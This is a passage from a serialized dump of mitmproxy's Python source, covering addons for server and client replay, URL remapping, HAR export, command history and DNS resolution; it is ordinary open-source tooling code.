exceptions.CommandError(str(e))\n        self.load_flows(flows)\n\n    @command.command(\"replay.server.stop\")\n    def clear(self) -> None:\n        \"\"\"\n        Stop server replay.\n        \"\"\"\n        self.flowmap = {}\n        ctx.master.addons.trigger(hooks.UpdateHook([]))\n\n    @command.command(\"replay.server.count\")\n    def count(self) -> int:\n        return sum(len(i) for i in self.flowmap.values())\n\n    def _hash(self, flow: http.HTTPFlow) -> Hashable:\n        \"\"\"\n        Calculates a loose hash of the flow request.\n        \"\"\"\n        r = flow.request\n        _, _, path, _, query, _ = urllib.parse.urlparse(r.url)\n        queriesArray = urllib.parse.parse_qsl(query, keep_blank_values=True)\n\n        key: list[Any] = [str(r.scheme), str(r.method), str(path)]\n        if not ctx.options.server_replay_ignore_content:\n            if ctx.options.server_replay_ignore_payload_params and r.multipart_form:\n                key.extend(\n                    (k, v)\n                    for k, v in r.multipart_form.items(multi=True)\n                    if k.decode(errors=\"replace\")\n                    not in ctx.options.server_replay_ignore_payload_params\n                )\n            elif ctx.options.server_replay_ignore_payload_params and r.urlencoded_form:\n                key.extend(\n                    (k, v)\n                    for k, v in r.urlencoded_form.items(multi=True)\n                    if k not in ctx.options.server_replay_ignore_payload_params\n                )\n            else:\n                key.append(str(r.raw_content))\n\n        if not ctx.options.server_replay_ignore_host:\n            key.append(r.pretty_host)\n        if not ctx.options.server_replay_ignore_port:\n            key.append(r.port)\n\n        filtered = []\n        ignore_params = ctx.options.server_replay_ignore_params or []\n        for p in queriesArray:\n            if p[0] not in ignore_params:\n                filtered.append(p)\n        for p in filtered:\n            key.append(p[0])\n            key.append(p[1])\n\n        if ctx.options.server_replay_use_headers:\n            headers = []\n            for i in ctx.options.server_replay_use_headers:\n                v = r.headers.get(i)\n                headers.append((i, v))\n            key.append(headers)\n        return hashlib.sha256(repr(key).encode(\"utf8\", \"surrogateescape\")).digest()\n\n    def next_flow(self, flow: http.HTTPFlow) -> http.HTTPFlow | None:\n        \"\"\"\n        Returns the next flow object, or None if no matching flow was\n        found.\n        \"\"\"\n        hash = self._hash(flow)\n        if hash in self.flowmap:\n            if ctx.options.server_replay_reuse or ctx.options.server_replay_nopop:\n                return next(\n                    (flow for flow in self.flowmap[hash] if flow.response), None\n                )\n            else:\n                ret = self.flowmap[hash].pop(0)\n                while not ret.response:\n                    if self.flowmap[hash]:\n                        ret = self.flowmap[hash].pop(0)\n                    else:\n                        del self.flowmap[hash]\n                        return None\n                if not self.flowmap[hash]:\n                    del self.flowmap[hash]\n                return ret\n        else:\n            return None\n\n    def configure(self, updated):\n        if ctx.options.server_replay_kill_extra:\n            logger.warning(\n                \"server_replay_kill_extra has been deprecated, \"\n                \"please update your config to use server_replay_extra='kill'.\"\n            )\n        if ctx.options.server_replay_nopop:  # pragma: no cover\n            logger.error(\n                \"server_replay_nopop has been renamed to server_replay_reuse, please update your config.\"\n            )\n        if not self.configured and ctx.options.server_replay:\n            self.configured = True\n            try:\n                flows = io.read_flows_from_paths(ctx.options.server_replay)\n            except exceptions.FlowReadException as e:\n                raise exceptions.OptionsError(str(e))\n            self.load_flows(flows)\n        if any(option in updated for option in HASH_OPTIONS):\n            self.recompute_hashes()\n\n    def recompute_hashes(self) -> None:\n        \"\"\"\n        Rebuild flowmap if the hashing method has changed during execution,\n        see https://github.com/mitmproxy/mitmproxy/issues/4506\n        \"\"\"\n        flows = [flow for lst in self.flowmap.values() for flow in lst]\n        self.load_flows(flows)\n\n    def request(self, f: http.HTTPFlow) -> None:\n        if self.flowmap:\n            rflow = self.next_flow(f)\n            if rflow:\n                assert rflow.response\n                response = rflow.response.copy()\n                if ctx.options.server_replay_refresh:\n                    response.refresh()\n                f.response = response\n                f.is_replay = \"response\"\n            elif (\n                ctx.options.server_replay_kill_extra\n                or ctx.options.server_replay_extra == \"kill\"\n            ):\n                logging.warning(\n                    \"server_playback: killed non-replay request {}\".format(\n                        f.request.url\n                    )\n                )\n                f.kill()\n            elif ctx.options.server_replay_extra != \"forward\":\n                logging.warning(\n                    \"server_playback: returned {} non-replay request {}\".format(\n                        ctx.options.server_replay_extra, f.request.url\n                    )\n                )\n                f.response = http.Response.make(int(ctx.options.server_replay_extra))\n                f.is_replay = \"response\"\n", "mitmproxy/addons/mapremote.py": "import re\nfrom collections.abc import Sequence\nfrom typing import NamedTuple\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy.utils.spec import parse_spec\n\n\nclass MapRemoteSpec(NamedTuple):\n    matches: flowfilter.TFilter\n    subject: str\n    replacement: str\n\n\ndef parse_map_remote_spec(option: str) -> MapRemoteSpec:\n    spec = MapRemoteSpec(*parse_spec(option))\n\n    try:\n        re.compile(spec.subject)\n    except re.error as e:\n        raise ValueError(f\"Invalid regular expression {spec.subject!r} ({e})\")\n\n    return spec\n\n\nclass MapRemote:\n    def __init__(self) -> None:\n        self.replacements: list[MapRemoteSpec] = []\n\n    def load(self, loader):\n        loader.add_option(\n            \"map_remote\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Map remote resources to another remote URL using a pattern of the form\n            \"[/flow-filter]/url-regex/replacement\", where the separator can\n            be any character.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"map_remote\" in updated:\n            self.replacements = []\n            for option in ctx.options.map_remote:\n                try:\n                    spec = parse_map_remote_spec(option)\n                except ValueError as e:\n                    raise exceptions.OptionsError(\n                        f\"Cannot parse map_remote option {option}: {e}\"\n                    ) from e\n\n                self.replacements.append(spec)\n\n    def request(self, flow: http.HTTPFlow) -> None:\n        if flow.response or flow.error or not flow.live:\n            return\n        for spec in self.replacements:\n            if spec.matches(flow):\n                url = flow.request.pretty_url\n                new_url = re.sub(spec.subject, spec.replacement, url)\n                # this is a bit messy: setting .url also updates the host header,\n                # so we really only do that if the replacement affected the URL.\n                if url != new_url:\n                    flow.request.url = new_url  # type: ignore\n", "mitmproxy/addons/savehar.py": "\"\"\"Write flow objects to a HAR file\"\"\"\n\nimport base64\nimport json\nimport logging\nimport zlib\nfrom collections.abc import Sequence\nfrom datetime import datetime\nfrom datetime import timezone\nfrom typing import Any\n\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy import types\nfrom mitmproxy import version\nfrom mitmproxy.addonmanager import Loader\nfrom mitmproxy.connection import Server\nfrom mitmproxy.coretypes.multidict import _MultiDict\nfrom mitmproxy.log import ALERT\nfrom mitmproxy.utils import human\nfrom mitmproxy.utils import strutils\n\nlogger = logging.getLogger(__name__)\n\n\nclass SaveHar:\n    def __init__(self) -> None:\n        self.flows: list[flow.Flow] = []\n        self.filt: flowfilter.TFilter | None = None\n\n    @command.command(\"save.har\")\n    def export_har(self, flows: Sequence[flow.Flow], path: types.Path) -> None:\n        \"\"\"Export flows to an HAR (HTTP Archive) file.\"\"\"\n\n        har = json.dumps(self.make_har(flows), indent=4).encode()\n\n        if path.endswith(\".zhar\"):\n            har = zlib.compress(har, 9)\n\n        with open(path, \"wb\") as f:\n            f.write(har)\n\n        logging.log(ALERT, f\"HAR file saved ({human.pretty_size(len(har))} bytes).\")\n\n    def make_har(self, flows: Sequence[flow.Flow]) -> dict:\n        entries = []\n        skipped = 0\n        # A list of server seen till now is maintained so we can avoid\n        # using 'connect' time for entries that use an existing connection.\n        servers_seen: set[Server] = set()\n\n        for f in flows:\n            if isinstance(f, http.HTTPFlow):\n                entries.append(self.flow_entry(f, servers_seen))\n            else:\n                skipped += 1\n\n        if skipped > 0:\n            logger.info(f\"Skipped {skipped} flows that weren't HTTP flows.\")\n\n        return {\n            \"log\": {\n                \"version\": \"1.2\",\n                \"creator\": {\n                    \"name\": \"mitmproxy\",\n                    \"version\": version.VERSION,\n                    \"comment\": \"\",\n                },\n                \"pages\": [],\n                \"entries\": entries,\n            }\n        }\n\n    def load(self, loader: Loader):\n        loader.add_option(\n            \"hardump\",\n            str,\n            \"\",\n            \"\"\"\n            Save a HAR file with all flows on exit.\n            You may select particular flows by setting save_stream_filter.\n            For mitmdump, enabling this option will mean that flows are kept in memory.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"save_stream_filter\" in updated:\n            if ctx.options.save_stream_filter:\n                try:\n                    self.filt = flowfilter.parse(ctx.options.save_stream_filter)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n            else:\n                self.filt = None\n\n        if \"hardump\" in updated:\n            if not ctx.options.hardump:\n                self.flows = []\n\n    def response(self, flow: http.HTTPFlow) -> None:\n        # websocket flows will receive a websocket_end,\n        # we don't want to persist them here already\n        if flow.websocket is None:\n            self._save_flow(flow)\n\n    def error(self, flow: http.HTTPFlow) -> None:\n        self.response(flow)\n\n    def websocket_end(self, flow: http.HTTPFlow) -> None:\n        self._save_flow(flow)\n\n    def _save_flow(self, flow: http.HTTPFlow) -> None:\n        if ctx.options.hardump:\n            flow_matches = self.filt is None or self.filt(flow)\n            if flow_matches:\n                self.flows.append(flow)\n\n    def done(self):\n        if ctx.options.hardump:\n            if ctx.options.hardump == \"-\":\n                har = self.make_har(self.flows)\n                print(json.dumps(har, indent=4))\n            else:\n                self.export_har(self.flows, ctx.options.hardump)\n\n    def flow_entry(self, flow: http.HTTPFlow, servers_seen: set[Server]) -> dict:\n        \"\"\"Creates HAR entry from flow\"\"\"\n\n        if flow.server_conn in servers_seen:\n            connect_time = -1.0\n            ssl_time = -1.0\n        elif flow.server_conn.timestamp_tcp_setup:\n            assert flow.server_conn.timestamp_start\n            connect_time = 1000 * (\n                flow.server_conn.timestamp_tcp_setup - flow.server_conn.timestamp_start\n            )\n\n            if flow.server_conn.timestamp_tls_setup:\n                ssl_time = 1000 * (\n                    flow.server_conn.timestamp_tls_setup\n                    - flow.server_conn.timestamp_tcp_setup\n                )\n            else:\n                ssl_time = -1.0\n            servers_seen.add(flow.server_conn)\n        else:\n            connect_time = -1.0\n            ssl_time = -1.0\n\n        if flow.request.timestamp_end:\n            send = 1000 * (flow.request.timestamp_end - flow.request.timestamp_start)\n        else:\n            send = 0\n\n        if flow.response and flow.request.timestamp_end:\n            wait = 1000 * (flow.response.timestamp_start - flow.request.timestamp_end)\n        else:\n            wait = 0\n\n        if flow.response and flow.response.timestamp_end:\n            receive = 1000 * (\n                flow.response.timestamp_end - flow.response.timestamp_start\n            )\n\n        else:\n            receive = 0\n\n        timings: dict[str, float | None] = {\n            \"connect\": connect_time,\n            \"ssl\": ssl_time,\n            \"send\": send,\n            \"receive\": receive,\n            \"wait\": wait,\n        }\n\n        if flow.response:\n            response_body_size = (\n                len(flow.response.raw_content) if flow.response.raw_content else 0\n            )\n            response_body_decoded_size = (\n                len(flow.response.content) if flow.response.content else 0\n            )\n            response_body_compression = response_body_decoded_size - response_body_size\n            response = {\n                \"status\": flow.response.status_code,\n                \"statusText\": flow.response.reason,\n                \"httpVersion\": flow.response.http_version,\n                \"cookies\": self.format_response_cookies(flow.response),\n                \"headers\": self.format_multidict(flow.response.headers),\n                \"content\": {\n                    \"size\": response_body_size,\n                    \"compression\": response_body_compression,\n                    \"mimeType\": flow.response.headers.get(\"Content-Type\", \"\"),\n                },\n                \"redirectURL\": flow.response.headers.get(\"Location\", \"\"),\n                \"headersSize\": len(str(flow.response.headers)),\n                \"bodySize\": response_body_size,\n            }\n            if flow.response.content and strutils.is_mostly_bin(flow.response.content):\n                response[\"content\"][\"text\"] = base64.b64encode(\n                    flow.response.content\n                ).decode()\n                response[\"content\"][\"encoding\"] = \"base64\"\n            else:\n                text_content = flow.response.get_text(strict=False)\n                if text_content is None:\n                    response[\"content\"][\"text\"] = \"\"\n                else:\n                    response[\"content\"][\"text\"] = text_content\n        else:\n            response = {\n                \"status\": 0,\n                \"statusText\": \"\",\n                \"httpVersion\": \"\",\n                \"headers\": [],\n                \"cookies\": [],\n                \"content\": {},\n                \"redirectURL\": \"\",\n                \"headersSize\": -1,\n                \"bodySize\": -1,\n                \"_transferSize\": 0,\n                \"_error\": None,\n            }\n            if flow.error:\n                response[\"_error\"] = flow.error.msg\n\n        if flow.request.method == \"CONNECT\":\n            url = f\"https://{flow.request.pretty_url}/\"\n        else:\n            url = flow.request.pretty_url\n\n        entry: dict[str, Any] = {\n            \"startedDateTime\": datetime.fromtimestamp(\n                flow.request.timestamp_start, timezone.utc\n            ).isoformat(),\n            \"time\": sum(v for v in timings.values() if v is not None and v >= 0),\n            \"request\": {\n                \"method\": flow.request.method,\n                \"url\": url,\n                \"httpVersion\": flow.request.http_version,\n                \"cookies\": self.format_multidict(flow.request.cookies),\n                \"headers\": self.format_multidict(flow.request.headers),\n                \"queryString\": self.format_multidict(flow.request.query),\n                \"headersSize\": len(str(flow.request.headers)),\n                \"bodySize\": len(flow.request.content) if flow.request.content else 0,\n            },\n            \"response\": response,\n            \"cache\": {},\n            \"timings\": timings,\n        }\n\n        if flow.request.method in [\"POST\", \"PUT\", \"PATCH\"]:\n            params = self.format_multidict(flow.request.urlencoded_form)\n            entry[\"request\"][\"postData\"] = {\n                \"mimeType\": flow.request.headers.get(\"Content-Type\", \"\"),\n                \"text\": flow.request.get_text(strict=False),\n                \"params\": params,\n            }\n\n        if flow.server_conn.peername:\n            entry[\"serverIPAddress\"] = str(flow.server_conn.peername[0])\n\n        websocket_messages = []\n        if flow.websocket:\n            for message in flow.websocket.messages:\n                if message.is_text:\n                    data = message.text\n                else:\n                    data = base64.b64encode(message.content).decode()\n                websocket_message = {\n                    \"type\": \"send\" if message.from_client else \"receive\",\n                    \"time\": message.timestamp,\n                    \"opcode\": message.type.value,\n                    \"data\": data,\n                }\n                websocket_messages.append(websocket_message)\n\n            entry[\"_resourceType\"] = \"websocket\"\n            entry[\"_webSocketMessages\"] = websocket_messages\n        return entry\n\n    def format_response_cookies(self, response: http.Response) -> list[dict]:\n        \"\"\"Formats the response's cookie header to list of cookies\"\"\"\n        cookie_list = response.cookies.items(multi=True)\n        rv = []\n        for name, (value, attrs) in cookie_list:\n            cookie = {\n                \"name\": name,\n                \"value\": value,\n                \"path\": attrs.get(\"path\", \"/\"),\n                \"domain\": attrs.get(\"domain\", \"\"),\n                \"httpOnly\": \"httpOnly\" in attrs,\n                \"secure\": \"secure\" in attrs,\n            }\n            # TODO: handle expires attribute here.\n            # This is not quite trivial because we need to parse random date formats.\n            # For now, we just ignore the attribute.\n\n            if \"sameSite\" in attrs:\n                cookie[\"sameSite\"] = attrs[\"sameSite\"]\n\n            rv.append(cookie)\n        return rv\n\n    def format_multidict(self, obj: _MultiDict[str, str]) -> list[dict]:\n        return [{\"name\": k, \"value\": v} for k, v in obj.items(multi=True)]\n", "mitmproxy/addons/command_history.py": "import logging\nimport os\nimport pathlib\nfrom collections.abc import Sequence\n\nfrom mitmproxy import command\nfrom mitmproxy import ctx\n\n\nclass CommandHistory:\n    VACUUM_SIZE = 1024\n\n    def __init__(self) -> None:\n        self.history: list[str] = []\n        self.filtered_history: list[str] = [\"\"]\n        self.current_index: int = 0\n\n    def load(self, loader):\n        loader.add_option(\n            \"command_history\",\n            bool,\n            True,\n            \"\"\"Persist command history between mitmproxy invocations.\"\"\",\n        )\n\n    @property\n    def history_file(self) -> pathlib.Path:\n        return pathlib.Path(os.path.expanduser(ctx.options.confdir)) / \"command_history\"\n\n    def running(self):\n        # FIXME: We have a weird bug where the contract for configure is not followed and it is never called with\n        # confdir or command_history as updated.\n        self.configure(\"command_history\")  # pragma: no cover\n\n    def configure(self, updated):\n        if \"command_history\" in updated or \"confdir\" in updated:\n            if ctx.options.command_history and self.history_file.is_file():\n                self.history = self.history_file.read_text().splitlines()\n                self.set_filter(\"\")\n\n    def done(self):\n        if ctx.options.command_history and len(self.history) >= self.VACUUM_SIZE:\n            # vacuum history so that it doesn't grow indefinitely.\n            history_str = \"\\n\".join(self.history[-self.VACUUM_SIZE // 2 :]) + \"\\n\"\n            try:\n                self.history_file.write_text(history_str)\n            except Exception as e:\n                logging.warning(f\"Failed writing to {self.history_file}: {e}\")\n\n    @command.command(\"commands.history.add\")\n    def add_command(self, command: str) -> None:\n        if not command.strip():\n            return\n\n        self.history.append(command)\n        if ctx.options.command_history:\n            try:\n                with self.history_file.open(\"a\") as f:\n                    f.write(f\"{command}\\n\")\n            except Exception as e:\n                logging.warning(f\"Failed writing to {self.history_file}: {e}\")\n\n        self.set_filter(\"\")\n\n    @command.command(\"commands.history.get\")\n    def get_history(self) -> Sequence[str]:\n        \"\"\"Get the entire command history.\"\"\"\n        return self.history.copy()\n\n    @command.command(\"commands.history.clear\")\n    def clear_history(self):\n        if self.history_file.exists():\n            try:\n                self.history_file.unlink()\n            except Exception as e:\n                logging.warning(f\"Failed deleting {self.history_file}: {e}\")\n        self.history = []\n        self.set_filter(\"\")\n\n    # Functionality to provide a filtered list that can be iterated through.\n\n    @command.command(\"commands.history.filter\")\n    def set_filter(self, prefix: str) -> None:\n        self.filtered_history = [cmd for cmd in self.history if cmd.startswith(prefix)]\n        self.filtered_history.append(prefix)\n        self.current_index = len(self.filtered_history) - 1\n\n    @command.command(\"commands.history.next\")\n    def get_next(self) -> str:\n        self.current_index = min(self.current_index + 1, len(self.filtered_history) - 1)\n        return self.filtered_history[self.current_index]\n\n    @command.command(\"commands.history.prev\")\n    def get_prev(self) -> str:\n        self.current_index = max(0, self.current_index - 1)\n        return self.filtered_history[self.current_index]\n", "mitmproxy/addons/anticomp.py": "from mitmproxy import ctx\n\n\nclass AntiComp:\n    def load(self, loader):\n        loader.add_option(\n            \"anticomp\",\n            bool,\n            False,\n            \"Try to convince servers to send us un-compressed data.\",\n        )\n\n    def request(self, flow):\n        if ctx.options.anticomp:\n            flow.request.anticomp()\n", "mitmproxy/addons/clientplayback.py": "from __future__ import annotations\n\nimport asyncio\nimport logging\nimport time\nfrom collections.abc import Sequence\nfrom types import TracebackType\nfrom typing import cast\nfrom typing import Literal\n\nimport mitmproxy.types\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy import io\nfrom mitmproxy.connection import ConnectionState\nfrom mitmproxy.connection import Server\nfrom mitmproxy.hooks import UpdateHook\nfrom mitmproxy.log import ALERT\nfrom mitmproxy.options import Options\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layers\nfrom mitmproxy.proxy import server\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.layer import CommandGenerator\nfrom mitmproxy.proxy.layers.http import HTTPMode\nfrom mitmproxy.proxy.mode_specs import UpstreamMode\nfrom mitmproxy.utils import asyncio_utils\n\nlogger = logging.getLogger(__name__)\n\n\nclass MockServer(layers.http.HttpConnection):\n    \"\"\"\n    A mock HTTP \"server\" that just pretends it received a full HTTP request,\n    which is then processed by the proxy core.\n    \"\"\"\n\n    flow: http.HTTPFlow\n\n    def __init__(self, flow: http.HTTPFlow, context: Context):\n        super().__init__(context, context.client)\n        self.flow = flow\n\n    def _handle_event(self, event: events.Event) -> CommandGenerator[None]:\n        if isinstance(event, events.Start):\n            content = self.flow.request.raw_content\n            self.flow.request.timestamp_start = self.flow.request.timestamp_end = (\n                time.time()\n            )\n            yield layers.http.ReceiveHttp(\n                layers.http.RequestHeaders(\n                    1,\n                    self.flow.request,\n                    end_stream=not (content or self.flow.request.trailers),\n                    replay_flow=self.flow,\n                )\n            )\n            if content:\n                yield layers.http.ReceiveHttp(layers.http.RequestData(1, content))\n            if self.flow.request.trailers:  # pragma: no cover\n                # TODO: Cover this once we support HTTP/1 trailers.\n                yield layers.http.ReceiveHttp(\n                    layers.http.RequestTrailers(1, self.flow.request.trailers)\n                )\n            yield layers.http.ReceiveHttp(layers.http.RequestEndOfMessage(1))\n        elif isinstance(\n            event,\n            (\n                layers.http.ResponseHeaders,\n                layers.http.ResponseData,\n                layers.http.ResponseTrailers,\n                layers.http.ResponseEndOfMessage,\n                layers.http.ResponseProtocolError,\n            ),\n        ):\n            pass\n        else:  # pragma: no cover\n            logger.warning(f\"Unexpected event during replay: {event}\")\n\n\nclass ReplayHandler(server.ConnectionHandler):\n    layer: layers.HttpLayer\n\n    def __init__(self, flow: http.HTTPFlow, options: Options) -> None:\n        client = flow.client_conn.copy()\n        client.state = ConnectionState.OPEN\n\n        context = Context(client, options)\n        context.server = Server(address=(flow.request.host, flow.request.port))\n        if flow.request.scheme == \"https\":\n            context.server.tls = True\n            context.server.sni = flow.request.pretty_host\n        if options.mode and options.mode[0].startswith(\"upstream:\"):\n            mode = UpstreamMode.parse(options.mode[0])\n            assert isinstance(mode, UpstreamMode)  # remove once mypy supports Self.\n            context.server.via = flow.server_conn.via = (mode.scheme, mode.address)\n\n        super().__init__(context)\n\n        if options.mode and options.mode[0].startswith(\"upstream:\"):\n            self.layer = layers.HttpLayer(context, HTTPMode.upstream)\n        else:\n            self.layer = layers.HttpLayer(context, HTTPMode.transparent)\n        self.layer.connections[client] = MockServer(flow, context.fork())\n        self.flow = flow\n        self.done = asyncio.Event()\n\n    async def replay(self) -> None:\n        self.server_event(events.Start())\n        await self.done.wait()\n\n    def log(\n        self,\n        message: str,\n        level: int = logging.INFO,\n        exc_info: Literal[True]\n        | tuple[type[BaseException] | None, BaseException | None, TracebackType | None]\n        | None = None,\n    ) -> None:\n        assert isinstance(level, int)\n        logger.log(level=level, msg=f\"[replay] {message}\")\n\n    async def handle_hook(self, hook: commands.StartHook) -> None:\n        (data,) = hook.args()\n        await ctx.master.addons.handle_lifecycle(hook)\n        if isinstance(data, flow.Flow):\n            await data.wait_for_resume()\n        if isinstance(hook, (layers.http.HttpResponseHook, layers.http.HttpErrorHook)):\n            if self.transports:\n                # close server connections\n                for x in self.transports.values():\n                    if x.handler:\n                        x.handler.cancel()\n                await asyncio.wait(\n                    [x.handler for x in self.transports.values() if x.handler]\n                )\n            # signal completion\n            self.done.set()\n\n\nclass ClientPlayback:\n    playback_task: asyncio.Task | None = None\n    inflight: http.HTTPFlow | None\n    queue: asyncio.Queue\n    options: Options\n    replay_tasks: set[asyncio.Task]\n\n    def __init__(self):\n        self.queue = asyncio.Queue()\n        self.inflight = None\n        self.task = None\n        self.replay_tasks = set()\n\n    def running(self):\n        self.options = ctx.options\n        self.playback_task = asyncio_utils.create_task(\n            self.playback(), name=\"client playback\"\n        )\n\n    async def done(self):\n        if self.playback_task:\n            self.playback_task.cancel()\n            try:\n                await self.playback_task\n            except asyncio.CancelledError:\n                pass\n\n    async def playback(self):\n        while True:\n            self.inflight = await self.queue.get()\n            try:\n                assert self.inflight\n                h = ReplayHandler(self.inflight, self.options)\n                if ctx.options.client_replay_concurrency == -1:\n                    t = asyncio_utils.create_task(\n                        h.replay(), name=\"client playback awaiting response\"\n                    )\n                    # keep a reference so this is not garbage collected\n                    self.replay_tasks.add(t)\n                    t.add_done_callback(self.replay_tasks.remove)\n                else:\n                    await h.replay()\n            except Exception:\n                logger.exception(f\"Client replay has crashed!\")\n            self.queue.task_done()\n            self.inflight = None\n\n    def check(self, f: flow.Flow) -> str | None:\n        if f.live or f == self.inflight:\n            return \"Can't replay live flow.\"\n        if f.intercepted:\n            return \"Can't replay intercepted flow.\"\n        if isinstance(f, http.HTTPFlow):\n            if not f.request:\n                return \"Can't replay flow with missing request.\"\n            if f.request.raw_content is None:\n                return \"Can't replay flow with missing content.\"\n            if f.websocket is not None:\n                return \"Can't replay WebSocket flows.\"\n        else:\n            return \"Can only replay HTTP flows.\"\n        return None\n\n    def load(self, loader):\n        loader.add_option(\n            \"client_replay\",\n            Sequence[str],\n            [],\n            \"Replay client requests from a saved file.\",\n        )\n        loader.add_option(\n            \"client_replay_concurrency\",\n            int,\n            1,\n            \"Concurrency limit on in-flight client replay requests. Currently the only valid values are 1 and -1 (no limit).\",\n        )\n\n    def configure(self, updated):\n        if \"client_replay\" in updated and ctx.options.client_replay:\n            try:\n                flows = io.read_flows_from_paths(ctx.options.client_replay)\n            except exceptions.FlowReadException as e:\n                raise exceptions.OptionsError(str(e))\n            self.start_replay(flows)\n\n        if \"client_replay_concurrency\" in updated:\n            if ctx.options.client_replay_concurrency not in [-1, 1]:\n                raise exceptions.OptionsError(\n                    \"Currently the only valid client_replay_concurrency values are -1 and 1.\"\n                )\n\n    @command.command(\"replay.client.count\")\n    def count(self) -> int:\n        \"\"\"\n        Approximate number of flows queued for replay.\n        \"\"\"\n        return self.queue.qsize() + int(bool(self.inflight))\n\n    @command.command(\"replay.client.stop\")\n    def stop_replay(self) -> None:\n        \"\"\"\n        Clear the replay queue.\n        \"\"\"\n        updated = []\n        while True:\n            try:\n                f = self.queue.get_nowait()\n            except asyncio.QueueEmpty:\n                break\n            else:\n                self.queue.task_done()\n                f.revert()\n                updated.append(f)\n\n        ctx.master.addons.trigger(UpdateHook(updated))\n        logger.log(ALERT, \"Client replay queue cleared.\")\n\n    @command.command(\"replay.client\")\n    def start_replay(self, flows: Sequence[flow.Flow]) -> None:\n        \"\"\"\n        Add flows to the replay queue, skipping flows that can't be replayed.\n        \"\"\"\n        updated: list[http.HTTPFlow] = []\n        for f in flows:\n            err = self.check(f)\n            if err:\n                logger.warning(err)\n                continue\n\n            http_flow = cast(http.HTTPFlow, f)\n\n            # Prepare the flow for replay\n            http_flow.backup()\n            http_flow.is_replay = \"request\"\n            http_flow.response = None\n            http_flow.error = None\n            self.queue.put_nowait(http_flow)\n            updated.append(http_flow)\n        ctx.master.addons.trigger(UpdateHook(updated))\n\n    @command.command(\"replay.client.file\")\n    def load_file(self, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Load flows from file, and add them to the replay queue.\n        \"\"\"\n        try:\n            flows = io.read_flows_from_paths([path])\n        except exceptions.FlowReadException as e:\n            raise exceptions.CommandError(str(e))\n        self.start_replay(flows)\n", "mitmproxy/addons/__init__.py": "from mitmproxy.addons import anticache\nfrom mitmproxy.addons import anticomp\nfrom mitmproxy.addons import block\nfrom mitmproxy.addons import blocklist\nfrom mitmproxy.addons import browser\nfrom mitmproxy.addons import clientplayback\nfrom mitmproxy.addons import command_history\nfrom mitmproxy.addons import comment\nfrom mitmproxy.addons import core\nfrom mitmproxy.addons import cut\nfrom mitmproxy.addons import disable_h2c\nfrom mitmproxy.addons import dns_resolver\nfrom mitmproxy.addons import export\nfrom mitmproxy.addons import maplocal\nfrom mitmproxy.addons import mapremote\nfrom mitmproxy.addons import modifybody\nfrom mitmproxy.addons import modifyheaders\nfrom mitmproxy.addons import next_layer\nfrom mitmproxy.addons import onboarding\nfrom mitmproxy.addons import proxyauth\nfrom mitmproxy.addons import proxyserver\nfrom mitmproxy.addons import save\nfrom mitmproxy.addons import savehar\nfrom mitmproxy.addons import script\nfrom mitmproxy.addons import serverplayback\nfrom mitmproxy.addons import stickyauth\nfrom mitmproxy.addons import stickycookie\nfrom mitmproxy.addons import strip_ech\nfrom mitmproxy.addons import tlsconfig\nfrom mitmproxy.addons import upstream_auth\n\n\ndef default_addons():\n    return [\n        core.Core(),\n        browser.Browser(),\n        block.Block(),\n        strip_ech.StripECH(),\n        blocklist.BlockList(),\n        anticache.AntiCache(),\n        anticomp.AntiComp(),\n        clientplayback.ClientPlayback(),\n        command_history.CommandHistory(),\n        comment.Comment(),\n        cut.Cut(),\n        disable_h2c.DisableH2C(),\n        export.Export(),\n        onboarding.Onboarding(),\n        proxyauth.ProxyAuth(),\n        proxyserver.Proxyserver(),\n        dns_resolver.DnsResolver(),\n        script.ScriptLoader(),\n        next_layer.NextLayer(),\n        serverplayback.ServerPlayback(),\n        mapremote.MapRemote(),\n        maplocal.MapLocal(),\n        modifybody.ModifyBody(),\n        modifyheaders.ModifyHeaders(),\n        stickyauth.StickyAuth(),\n        stickycookie.StickyCookie(),\n        save.Save(),\n        savehar.SaveHar(),\n        tlsconfig.TlsConfig(),\n        upstream_auth.UpstreamAuth(),\n    ]\n", "mitmproxy/addons/dns_resolver.py": "import asyncio\nimport ipaddress\nimport socket\nfrom collections.abc import Callable\nfrom collections.abc import Iterable\n\nfrom mitmproxy import dns\nfrom mitmproxy.proxy import mode_specs\n\nIP4_PTR_SUFFIX = \".in-addr.arpa\"\nIP6_PTR_SUFFIX = \".ip6.arpa\"\n\n\nclass ResolveError(Exception):\n    \"\"\"Exception thrown by different resolve methods.\"\"\"\n\n    def __init__(self, response_code: int) -> None:\n        assert response_code != dns.response_codes.NOERROR\n        self.response_code = response_code\n\n\nasync def resolve_question_by_name(\n    question: dns.Question,\n    loop: asyncio.AbstractEventLoop,\n    family: socket.AddressFamily,\n    ip: Callable[[str], ipaddress.IPv4Address | ipaddress.IPv6Address],\n) -> Iterable[dns.ResourceRecord]:\n    try:\n        addrinfos = await loop.getaddrinfo(\n            host=question.name, port=0, family=family, type=socket.SOCK_STREAM\n        )\n    except socket.gaierror as e:\n        if e.errno == socket.EAI_NONAME:\n            raise ResolveError(dns.response_codes.NXDOMAIN)\n        else:\n            # NOTE might fail on Windows for IPv6 queries:\n            # https://stackoverflow.com/questions/66755681/getaddrinfo-c-on-windows-not-handling-ipv6-correctly-returning-error-code-1\n            raise ResolveError(dns.response_codes.SERVFAIL)  # pragma: no cover\n    return map(\n        lambda addrinfo: dns.ResourceRecord(\n            name=question.name,\n            type=question.type,\n            class_=question.class_,\n            ttl=dns.ResourceRecord.DEFAULT_TTL,\n            data=ip(addrinfo[4][0]).packed,\n        ),\n        addrinfos,\n    )\n\n\nasync def resolve_question_by_addr(\n    question: dns.Question,\n    loop: asyncio.AbstractEventLoop,\n    suffix: str,\n    sockaddr: Callable[[list[str]], tuple[str, int] | tuple[str, int, int, int]],\n) -> Iterable[dns.ResourceRecord]:\n    try:\n    